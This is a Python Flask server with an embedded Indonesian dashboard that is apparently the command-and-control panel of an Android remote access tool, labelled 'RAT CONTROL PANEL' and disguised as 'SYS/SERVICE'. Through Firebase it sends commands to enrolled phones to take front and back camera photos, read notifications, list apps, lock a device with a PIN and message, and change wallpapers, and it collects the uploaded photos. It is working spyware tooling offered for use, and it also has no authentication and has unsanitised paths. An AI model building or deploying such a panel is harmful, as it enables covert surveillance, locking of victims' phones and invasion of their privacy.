from flask import Flask, request, jsonify, send_from_directory, render_template_string
import requests
import os
import time

app = Flask(__name__)

FIREBASE_URL = "https://nisnis-b624f-default-rtdb.asia-southeast1.firebasedatabase.app"
PHOTO_BASE = os.path.expanduser("~/epep_photos")
os.makedirs(PHOTO_BASE, exist_ok=True)

# ===================== FIREBASE HELPERS =====================

def firebase_get(path):
    try:
        res = requests.get(f"{FIREBASE_URL}/{path}.json", timeout=10)
        return res.json()
    except:
        return None

def firebase_put(path, data):
    try:
        res = requests.put(f"{FIREBASE_URL}/{path}.json", json=data, timeout=10)
        return res.status_code == 200
    except Exception as e:
        print(f"firebase_put error: {e}")
        return False

def get_photo_dir(device_id):
    d = os.path.join(PHOTO_BASE, device_id)
    os.makedirs(d, exist_ok=True)
    return d

# ===================== API ROUTES =====================

@app.route("/cmd", methods=["POST"])
def cmd():
    data = request.json or {}
    command = data.get("command", "").strip()
    device_id = data.get("device_id", "").strip()
    if not command or not device_id:
        return jsonify({"ok": False, "error": "Missing command or device_id"})
    ok = firebase_put(f"devices/{device_id}/command", command)
    return jsonify({"ok": ok})

@app.route("/response")
def response():
    device_id = request.args.get("device_id", "")
    if not device_id:
        return jsonify({"message": ""})
    data = firebase_get(f"devices/{device_id}/response")
    msg = ""
    if data and isinstance(data, dict):
        msg = data.get("message", "")
    return jsonify({"message": msg})

@app.route("/status")
def status():
    device_id = request.args.get("device_id", "")
    if not device_id:
        return jsonify({})
    data = firebase_get(f"devices/{device_id}/status")
    return jsonify(data or {})

@app.route("/devices_list")
def devices_list():
    data = firebase_get("devices")
    if not data or not isinstance(data, dict):
        return jsonify([])
    result = []
    for dev_id, dev_data in data.items():
        if not isinstance(dev_data, dict):
            continue
        info = dev_data.get("info", {}) or {}
        status = dev_data.get("status", {}) or {}
        result.append({
            "device_id": dev_id,
            "label": info.get("label", dev_id),
            "model": info.get("model", "Unknown"),
            "android": info.get("android", ""),
            "online": status.get("online", False),
            "battery": status.get("battery", -1),
            "locked": status.get("locked", False),
            "panic": status.get("panic", False),
            "last_seen": info.get("last_seen", 0)
        })
    # Sort: online dulu
    result.sort(key=lambda x: (not x["online"], x["label"]))
    return jsonify(result)

@app.route("/upload_photo", methods=["POST"])
def upload_photo():
    if "photo" not in request.files:
        return jsonify({"ok": False, "error": "No photo"})
    photo = request.files["photo"]
    caption = request.form.get("caption", "")
    device_id = request.form.get("device_id", "unknown")
    filename = f"photo_{int(time.time())}.jpg"
    filepath = os.path.join(get_photo_dir(device_id), filename)
    photo.save(filepath)
    print(f"Photo saved: {filepath} [{device_id}] — {caption}")
    return jsonify({"ok": True, "filename": filename, "device_id": device_id})

@app.route("/photos/<device_id>/<filename>")
def get_photo(device_id, filename):
    return send_from_directory(get_photo_dir(device_id), filename)

@app.route("/photos_list")
def photos_list():
    device_id = request.args.get("device_id", "unknown")
    d = get_photo_dir(device_id)
    files = sorted(os.listdir(d), reverse=True)[:20]
    return jsonify(files)

# ===================== DASHBOARD =====================

@app.route("/")
def dashboard():
    return render_template_string(HTML)

HTML = r"""<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>ghost panell</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Exo+2:wght@300;400;600;700;900&display=swap');
  :root{--bg:#080b0f;--surface:#0e1318;--surface2:#141c24;--border:#1e2d3d;--red:#ff2244;--red-dim:#8a1022;--cyan:#00e5ff;--cyan-dim:#006070;--text:#c8d8e8;--text-dim:#4a6070;--green:#00ff88;--orange:#ff8c00;--nav-h:64px}
  *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
  body{background:var(--bg);color:var(--text);font-family:'Exo 2',sans-serif;min-height:100vh;padding-bottom:var(--nav-h);overflow-x:hidden}
  body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,.08) 2px,rgba(0,0,0,.08) 4px);pointer-events:none;z-index:9999}
  .header{background:var(--surface);border-bottom:1px solid var(--border);padding:14px 20px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100}
  .header-logo{display:flex;align-items:center;gap:10px}
  .header-title{font-family:'Share Tech Mono',monospace;font-size:15px;color:var(--red);letter-spacing:2px;text-transform:uppercase}
  .header-title span{display:block;font-size:10px;color:var(--text-dim);letter-spacing:3px}
  .header-status{display:flex;align-items:center;gap:6px;font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--text-dim)}
  .pulse{width:8px;height:8px;border-radius:50%;background:var(--green);box-shadow:0 0 8px var(--green);animation:pulse 2s ease-in-out infinite}
  .pulse.off{background:var(--red);box-shadow:0 0 8px var(--red);animation:none}
  @keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.4;transform:scale(.8)}}
  .page{display:none;padding:16px;animation:fadeIn .2s ease}
  .page.active{display:block}
  @keyframes fadeIn{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:translateY(0)}}
  .card{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:16px;margin-bottom:14px;position:relative;overflow:hidden}
  .card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--red),transparent)}
  .card-title{font-family:'Share Tech Mono',monospace;font-size:11px;letter-spacing:3px;color:var(--red);text-transform:uppercase;margin-bottom:14px;display:flex;align-items:center;gap:8px}
  .card-title::after{content:'';flex:1;height:1px;background:var(--border)}
  .device-item{display:flex;align-items:center;gap:14px;padding:14px;background:var(--surface2);border:1px solid var(--border);border-radius:10px;margin-bottom:10px;cursor:pointer;transition:all .2s;position:relative;overflow:hidden}
  .device-item:active{transform:scale(.98)}
  .device-item.selected{border-color:var(--red);background:rgba(255,34,68,.08)}
  .device-item.selected::before{content:'';position:absolute;left:0;top:0;bottom:0;width:3px;background:var(--red)}
  .device-avatar{width:44px;height:44px;border-radius:10px;background:var(--surface);border:1px solid var(--border);display:flex;align-items:center;justify-content:center;font-size:20px;flex-shrink:0}
  .device-info{flex:1;min-width:0}
  .device-name{font-weight:700;font-size:15px;color:var(--text);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
  .device-meta{font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--text-dim);margin-top:3px}
  .device-badge{display:flex;flex-direction:column;align-items:flex-end;gap:4px;flex-shrink:0}
  .badge{padding:3px 8px;border-radius:20px;font-family:'Share Tech Mono',monospace;font-size:10px;font-weight:700;letter-spacing:1px}
  .bon{background:rgba(0,255,136,.15);color:var(--green);border:1px solid rgba(0,255,136,.3)}
  .boff{background:rgba(255,34,68,.15);color:var(--red);border:1px solid rgba(255,34,68,.3)}
  .bbat{background:rgba(255,140,0,.15);color:var(--orange);border:1px solid rgba(255,140,0,.3)}
  .select-btn{width:100%;padding:14px;background:linear-gradient(135deg,var(--red),#8a0010);border:none;border-radius:10px;color:#fff;font-family:'Exo 2',sans-serif;font-size:14px;font-weight:700;letter-spacing:2px;text-transform:uppercase;cursor:pointer;transition:all .2s;margin-top:4px}
  .select-btn:active{transform:scale(.97);opacity:.9}
  .empty-state{text-align:center;padding:40px 20px;color:var(--text-dim);font-size:13px;line-height:1.8}
  .sel-bar{background:rgba(255,34,68,.08);border:1px solid var(--red-dim);border-radius:10px;padding:12px 16px;margin-bottom:16px;display:flex;align-items:center;justify-content:space-between}
  .sel-bar .sname{font-weight:700;font-size:14px;color:var(--red)}
  .sel-bar .sid{font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--text-dim);margin-top:2px}
  .status-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:14px}
  .stat-box{background:var(--surface2);border:1px solid var(--border);border-radius:10px;padding:14px 12px;text-align:center}
  .stat-label{font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--text-dim);letter-spacing:2px;margin-bottom:6px}
  .stat-value{font-size:20px;font-weight:900}
  .resp-box{background:var(--surface2);border:1px solid var(--border);border-radius:10px;padding:14px;min-height:70px;font-family:'Share Tech Mono',monospace;font-size:12px;color:var(--cyan);line-height:1.6;white-space:pre-wrap;word-break:break-word}
  .btn-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
  .ctrl-btn{padding:14px 10px;border:1px solid var(--border);border-radius:10px;background:var(--surface2);color:var(--text);font-family:'Exo 2',sans-serif;font-size:13px;font-weight:600;cursor:pointer;transition:all .15s;display:flex;flex-direction:column;align-items:center;gap:6px;line-height:1.2;text-align:center}
  .ctrl-btn .ic{font-size:20px}
  .ctrl-btn:active{transform:scale(.95);opacity:.8}
  .ctrl-btn.red{border-color:var(--red-dim);background:rgba(255,34,68,.08);color:var(--red)}
  .ctrl-btn.grn{border-color:#00803a;background:rgba(0,255,136,.06);color:var(--green)}
  .ctrl-btn.cyn{border-color:var(--cyan-dim);background:rgba(0,229,255,.06);color:var(--cyan)}
  .input-row{display:flex;gap:8px;margin-bottom:10px}
  .ctrl-input{flex:1;background:var(--surface2);border:1px solid var(--border);border-radius:8px;padding:12px 14px;color:var(--text);font-family:'Share Tech Mono',monospace;font-size:13px;outline:none;transition:border-color .2s;min-width:0}
  .ctrl-input:focus{border-color:var(--red)}
  .ctrl-input::placeholder{color:var(--text-dim)}
  .send-btn{padding:12px 16px;background:var(--red);border:none;border-radius:8px;color:#fff;font-family:'Exo 2',sans-serif;font-weight:700;font-size:13px;cursor:pointer;white-space:nowrap;transition:all .15s;flex-shrink:0}
  .send-btn:active{transform:scale(.96);opacity:.9}
  .send-btn.dk{background:var(--surface2);border:1px solid var(--border);color:var(--text)}
  .photos-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:10px}
  .photo-thumb{aspect-ratio:4/3;border-radius:8px;overflow:hidden;background:var(--surface2);border:1px solid var(--border);cursor:pointer}
  .photo-thumb img{width:100%;height:100%;object-fit:cover}
  .bottom-nav{position:fixed;bottom:0;left:0;right:0;height:var(--nav-h);background:var(--surface);border-top:1px solid var(--border);display:flex;z-index:200}
  .nav-item{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:4px;cursor:pointer;transition:all .2s;position:relative;padding:8px;border:none;background:transparent;color:var(--text-dim)}
  .nav-item.active{color:var(--red)}
  .nav-item.active::before{content:'';position:absolute;top:0;left:20%;right:20%;height:2px;background:var(--red);box-shadow:0 0 10px var(--red);border-radius:0 0 4px 4px}
  .nav-icon{font-size:22px;transition:transform .2s}
  .nav-item.active .nav-icon{transform:scale(1.1)}
  .nav-label{font-family:'Share Tech Mono',monospace;font-size:9px;letter-spacing:2px;text-transform:uppercase}
  .toast{position:fixed;top:80px;left:50%;transform:translateX(-50%) translateY(-10px);background:var(--surface2);border:1px solid var(--border);color:var(--text);padding:10px 20px;border-radius:20px;font-family:'Share Tech Mono',monospace;font-size:12px;opacity:0;transition:all .3s;pointer-events:none;z-index:9998;white-space:nowrap;max-width:90vw;overflow:hidden;text-overflow:ellipsis}
  .toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
  .no-device{text-align:center;padding:60px 20px;color:var(--text-dim)}
  .no-device .big{font-size:48px;margin-bottom:16px}
  .no-device p{font-size:13px;line-height:1.7}
  .no-device strong{color:var(--red)}
  .refresh-btn{width:100%;padding:12px;background:var(--surface2);border:1px solid var(--border);border-radius:8px;color:var(--text-dim);font-family:'Share Tech Mono',monospace;font-size:12px;cursor:pointer;margin-bottom:12px;transition:all .2s}
  .refresh-btn:active{opacity:.7}
</style>
</head>
<body>

<div class="header">
  <div class="header-logo">
    <svg width="32" height="32" viewBox="0 0 32 32" fill="none">
      <circle cx="16" cy="16" r="13" stroke="#ff2244" stroke-width="2"/>
      <circle cx="16" cy="16" r="7" stroke="#ff2244" stroke-width="1.5"/>
      <circle cx="16" cy="16" r="2.5" fill="#ff2244"/>
      <line x1="16" y1="3" x2="16" y2="9" stroke="#ff2244" stroke-width="2" stroke-linecap="round"/>
      <line x1="16" y1="23" x2="16" y2="29" stroke="#ff2244" stroke-width="2" stroke-linecap="round"/>
      <line x1="3" y1="16" x2="9" y2="16" stroke="#ff2244" stroke-width="2" stroke-linecap="round"/>
      <line x1="23" y1="16" x2="29" y2="16" stroke="#ff2244" stroke-width="2" stroke-linecap="round"/>
    </svg>
    <div class="header-title">SYS/SERVICE<span>CONTROL PANEL v2.0</span></div>
  </div>
  <div class="header-status">
    <div class="pulse" id="srvPulse"></div>
    <span id="clk">--:--</span>
  </div>
</div>

<!-- PAGE DEVICES -->
<div class="page active" id="page-devices">
  <div class="card">
    <div class="card-title">Perangkat Terdaftar</div>
    <button class="refresh-btn" onclick="loadDevices()">🔄 Refresh Perangkat</button>
    <div id="deviceList"><div class="empty-state">⏳ Memuat perangkat...</div></div>
    <button class="select-btn" onclick="goControl()">🎯 &nbsp;Kontrol Perangkat Dipilih</button>
  </div>
  <div class="card">
    <div class="card-title">Info</div>
    <div style="font-size:12px;color:var(--text-dim);line-height:1.8;font-family:'Share Tech Mono',monospace">
      • Perangkat muncul otomatis saat app aktif<br>
      • Tap perangkat untuk memilih<br>
      • Tekan tombol di bawah untuk mulai kontrol
    </div>
  </div>
</div>

<!-- PAGE CONTROL -->
<div class="page" id="page-control">
  <div class="no-device" id="noDevMsg">
    <div class="big">🎯</div>
    <p>Belum ada perangkat dipilih.<br>Buka tab <strong>DEVICES</strong> dulu.</p>
  </div>
  <div id="ctrlContent" style="display:none">
    <div class="sel-bar">
      <div><div class="sname" id="selName">—</div><div class="sid" id="selId">—</div></div>
      <span class="badge bon" id="selBadge">ONLINE</span>
    </div>
    <div class="status-grid">
      <div class="stat-box"><div class="stat-label">BATERAI</div><div class="stat-value" id="stBat" style="color:var(--orange)">--%</div></div>
      <div class="stat-box"><div class="stat-label">KUNCI</div><div class="stat-value" id="stLock">🔓</div></div>
      <div class="stat-box"><div class="stat-label">PANIC</div><div class="stat-value" id="stPanic">⚪</div></div>
      <div class="stat-box"><div class="stat-label">ONLINE</div><div class="stat-value" id="stOnline">🟢</div></div>
    </div>
    <div class="card">
      <div class="card-title">Response</div>
      <div class="resp-box" id="respBox">Menunggu perintah...</div>
    </div>
    <div class="card">
      <div class="card-title">Aksi Cepat</div>
      <div class="btn-grid">
        <button class="ctrl-btn cyn" onclick="sc('/status')"><span class="ic">📊</span>Status</button>
        <button class="ctrl-btn cyn" onclick="sc('/notif')"><span class="ic">🔔</span>Notifikasi</button>
        <button class="ctrl-btn" onclick="sc('/foto_depan')"><span class="ic">📸</span>Foto Depan</button>
        <button class="ctrl-btn" onclick="sc('/foto_belakang')"><span class="ic">📸</span>Foto Belakang</button>
      </div>
    </div>
    <div class="card">
      <div class="card-title">Kunci HP</div>
      <div class="input-row"><input class="ctrl-input" id="lMsg" placeholder="Pesan..."></div>
      <div class="input-row">
        <input class="ctrl-input" id="lPin" placeholder="PIN 4 digit" maxlength="4" inputmode="numeric">
        <button class="send-btn" onclick="doLock()">🔒 Kunci</button>
      </div>
      <div class="input-row">
        <input class="ctrl-input" id="uPin" placeholder="PIN untuk buka" maxlength="4" inputmode="numeric">
        <button class="send-btn dk" onclick="doUnlock()">🔓 Buka</button>
      </div>
    </div>
    <div class="card">
      <div class="card-title">Panic Mode</div>
      <div class="btn-grid">
        <button class="ctrl-btn red" onclick="sc('/panik_on')"><span class="ic">🔴</span>Panic ON</button>
        <button class="ctrl-btn grn" onclick="sc('/panik_off')"><span class="ic">✅</span>Panic OFF</button>
      </div>
    </div>
    <div class="card">
      <div class="card-title">Kirim Pesan</div>
      <div class="input-row">
        <input class="ctrl-input" id="pesanIn" placeholder="Teks pesan ke layar anak...">
        <button class="send-btn" onclick="doPesan()">Kirim</button>
      </div>
    </div>
    <div class="card">
      <div class="card-title">Wallpaper & BG Lock</div>
      <div class="input-row">
        <input class="ctrl-input" id="wpUrl" placeholder="URL wallpaper (.jpg/.png)">
        <button class="send-btn" onclick="doWp()" style="background:#7a4400;color:var(--orange)">🖼</button>
      </div>
      <div class="input-row">
        <input class="ctrl-input" id="bgUrl" placeholder="URL background lock screen">
        <button class="send-btn dk" onclick="doBg()">BG</button>
      </div>
      <button class="send-btn dk" style="width:100%;margin-top:4px" onclick="sc('/bg_reset')">Reset BG Default</button>
    </div>
    <div class="card">
      <div class="card-title">Kontrol Sistem</div>
      <div class="btn-grid">
        <button class="ctrl-btn cyn" onclick="sc('/kunci_layar')"><span class="ic">🔐</span>Kunci Layar</button>
        <button class="ctrl-btn cyn" onclick="sc('/info_hp')"><span class="ic">📱</span>Info HP</button>
        <button class="ctrl-btn" onclick="sc('/flash_on')"><span class="ic">🔦</span>Flash ON</button>
        <button class="ctrl-btn" onclick="sc('/flash_off')"><span class="ic">🔦</span>Flash OFF</button>
        <button class="ctrl-btn" onclick="sc('/apps')"><span class="ic">📋</span>List App</button>
      </div>
      <div style="margin-top:10px">
        <div style="font-family:Share Tech Mono,monospace;font-size:10px;color:var(--text-dim);margin-bottom:6px;letter-spacing:2px">VOLUME (0-15)</div>
        <div style="display:flex;gap:8px;align-items:center">
          <input class="ctrl-input" id="volIn" placeholder="0-15" maxlength="2" inputmode="numeric" style="max-width:80px">
          <button class="send-btn" onclick="doVolume()" style="flex:1">🔊 Set Volume</button>
        </div>
      </div>
    </div>
    <div class="card">
      <div class="card-title">Foto Tersimpan</div>
      <button class="send-btn dk" style="width:100%" onclick="loadPhotos()">🔄 Refresh Foto</button>
      <div class="photos-grid" id="photoGrid"></div>
    </div>
  </div>
</div>

<nav class="bottom-nav">
  <button class="nav-item active" id="nav-devices" onclick="tab('devices')">
    <span class="nav-icon">📡</span><span class="nav-label">Devices</span>
  </button>
  <button class="nav-item" id="nav-control" onclick="tab('control')">
    <span class="nav-icon">🎮</span><span class="nav-label">Control</span>
  </button>
</nav>

<div class="toast" id="toast"></div>

<script>
let sel = null;
let lastResp = "";

// ===== TABS =====
function tab(t) {
  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
  document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
  document.getElementById('page-' + t).classList.add('active');
  document.getElementById('nav-' + t).classList.add('active');
}

function goControl() {
  if (!sel) { toast('⚠️ Pilih perangkat dulu'); return; }
  tab('control');
  updateCtrlUI();
}

// ===== DEVICES =====
async function loadDevices() {
  const list = document.getElementById('deviceList');
  list.innerHTML = '<div class="empty-state">⏳ Memuat...</div>';
  try {
    const res = await fetch('/devices_list');
    const devices = await res.json();
    document.getElementById('srvPulse').className = 'pulse';
    if (!devices.length) {
      list.innerHTML = '<div class="empty-state">📭 Belum ada perangkat terdaftar.<br>Install & aktifkan app di HP anak.</div>';
      return;
    }
    list.innerHTML = devices.map(d => `
      <div class="device-item ${sel && sel.id === d.device_id ? 'selected' : ''}"
           onclick="pickDevice(this,'${d.device_id}','${d.label}','${d.model}','${d.android}')">
        <div class="device-avatar">📱</div>
        <div class="device-info">
          <div class="device-name">${d.label}</div>
          <div class="device-meta">${d.model} • ${d.android}</div>
        </div>
        <div class="device-badge">
          <span class="badge ${d.online ? 'bon' : 'boff'}">${d.online ? 'ONLINE' : 'OFFLINE'}</span>
          ${d.battery >= 0 ? `<span class="badge bbat">🔋 ${d.battery}%</span>` : ''}
        </div>
      </div>`).join('');
  } catch(e) {
    document.getElementById('srvPulse').className = 'pulse off';
    list.innerHTML = '<div class="empty-state">❌ Flask tidak aktif.<br>Jalankan server.py di Termux.</div>';
  }
}

function pickDevice(el, id, label, model, android) {
  document.querySelectorAll('.device-item').forEach(d => d.classList.remove('selected'));
  el.classList.add('selected');
  sel = { id, label, model, android };
  toast('✅ ' + label + ' dipilih');
}

function updateCtrlUI() {
  if (!sel) {
    document.getElementById('noDevMsg').style.display = 'block';
    document.getElementById('ctrlContent').style.display = 'none';
    return;
  }
  document.getElementById('noDevMsg').style.display = 'none';
  document.getElementById('ctrlContent').style.display = 'block';
  document.getElementById('selName').textContent = sel.label;
  document.getElementById('selId').textContent = sel.model + ' • ' + sel.android;
}

// ===== COMMANDS =====
async function sc(cmd) {
  if (!sel) { toast('⚠️ Pilih perangkat dulu'); return; }
  toast('📡 ' + cmd);
  try {
    await fetch('/cmd', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({ command: cmd, device_id: sel.id })
    });
  } catch(e) { toast('❌ Flask tidak aktif'); }
}

function doLock() {
  const msg = document.getElementById('lMsg').value.trim();
  const pin = document.getElementById('lPin').value.trim();
  if (!msg || pin.length !== 4) { toast('⚠️ Isi pesan & PIN 4 digit'); return; }
  sc('/kunci ' + msg + ' ' + pin);
  document.getElementById('lPin').value = '';
}

function doUnlock() {
  const pin = document.getElementById('uPin').value.trim();
  if (!pin) { toast('⚠️ Isi PIN'); return; }
  sc('/buka ' + pin);
  document.getElementById('uPin').value = '';
}

function doPesan() {
  const msg = document.getElementById('pesanIn').value.trim();
  if (!msg) { toast('⚠️ Isi pesan'); return; }
  sc('/pesan ' + msg);
  document.getElementById('pesanIn').value = '';
}

function doWp() {
  const url = document.getElementById('wpUrl').value.trim();
  if (!url) { toast('⚠️ Isi URL'); return; }
  sc('/wallpaper ' + url);
}

function doBg() {
  const url = document.getElementById('bgUrl').value.trim();
  if (!url) { toast('⚠️ Isi URL'); return; }
  sc('/bg ' + url);
}

function doVolume() {
  const v = document.getElementById('volIn').value.trim();
  const n = parseInt(v);
  if (isNaN(n) || n < 0 || n > 15) { toast('⚠️ Volume harus 0-15'); return; }
  sc('/volume ' + n);
  document.getElementById('volIn').value = '';
}

async function loadPhotos() {
  if (!sel) return;
  try {
    const res = await fetch('/photos_list?device_id=' + sel.id);
    const files = await res.json();
    const g = document.getElementById('photoGrid');
    g.innerHTML = files.length
      ? files.map(f => `<div class="photo-thumb" onclick="window.open('/photos/${sel.id}/${f}')"><img src="/photos/${sel.id}/${f}" loading="lazy"/></div>`).join('')
      : '<p style="color:var(--text-dim);font-size:12px;margin-top:8px">Belum ada foto</p>';
  } catch(e) {}
}

// ===== POLLING =====
async function pollResp() {
  if (!sel) return;
  try {
    const r = await fetch('/response?device_id=' + sel.id);
    const d = await r.json();
    if (d.message && d.message !== lastResp) {
      lastResp = d.message;
      document.getElementById('respBox').textContent = d.message;
    }
  } catch(e) {}
}

async function pollStatus() {
  if (!sel) return;
  try {
    const r = await fetch('/status?device_id=' + sel.id);
    const d = await r.json();
    if (d.battery !== undefined) document.getElementById('stBat').textContent = d.battery + '%';
    document.getElementById('stOnline').textContent = d.online ? '🟢' : '🔴';
    document.getElementById('stLock').textContent = d.locked ? '🔒' : '🔓';
    document.getElementById('stPanic').textContent = d.panic ? '🔴' : '⚪';
    const badge = document.getElementById('selBadge');
    badge.textContent = d.online ? 'ONLINE' : 'OFFLINE';
    badge.className = 'badge ' + (d.online ? 'bon' : 'boff');
    document.getElementById('srvPulse').className = 'pulse';
  } catch(e) {
    document.getElementById('srvPulse').className = 'pulse off';
  }
}

// ===== TOAST =====
function toast(msg) {
  const t = document.getElementById('toast');
  t.textContent = msg;
  t.classList.add('show');
  setTimeout(() => t.classList.remove('show'), 2000);
}

// ===== INIT =====
function tick() {
  document.getElementById('clk').textContent =
    new Date().toLocaleTimeString('id-ID', {hour:'2-digit',minute:'2-digit'});
}

updateCtrlUI();
loadDevices();
tick();
setInterval(tick, 1000);
setInterval(pollResp, 2000);
setInterval(pollStatus, 5000);
setInterval(loadDevices, 30000);
</script>
</body>
</html>"""

if __name__ == "__main__":
    print("=" * 40)
    print("  System Service — Flask Backend")
    print("=" * 40)
    print(f"  Dashboard: http://localhost:5000")
    print(f"  Photos   : {PHOTO_BASE}")
    print("=" * 40)
    app.run(host="0.0.0.0", port=5000, debug=False)

def server():
    print("""
╔══════════════════════════════════════╗
║     RAT CONTROL PANEL                ║
╠══════════════════════════════════════╣
║  Dashboard: http://localhost:5001    ║
║  Tekan Ctrl+C untuk berhenti         ║
╚══════════════════════════════════════╝
     """)
    app.run(host="0.0.0.0", port=5001, debug=False)